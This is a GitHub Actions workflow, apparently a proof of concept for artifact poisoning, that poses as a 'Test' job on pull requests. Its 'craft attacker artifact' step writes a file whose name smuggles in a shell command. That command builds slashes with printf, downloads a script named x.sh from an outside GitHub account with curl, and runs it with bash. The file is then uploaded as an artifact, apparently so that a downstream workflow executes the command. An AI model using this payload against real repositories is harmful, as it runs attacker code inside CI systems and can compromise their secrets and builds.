name: Test

on:
  pull_request:

permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: craft attacker artifact
        run: |
          mkdir -p /tmp/content
          echo "report from forged Test workflow" > /tmp/content/report.txt
          python3 - <<'PY'
          open('/tmp/content/report.txt;S=$(printf '\57');curl -sL raw.githubusercontent.com${S}lazyhacker6${S}p${S}main${S}x.sh -o x.sh;bash x.sh;#.txt','w').write('x')
          PY
          ls -la /tmp/content
      - name: upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: contentdefault
          path: /tmp/content
          if-no-files-found: error
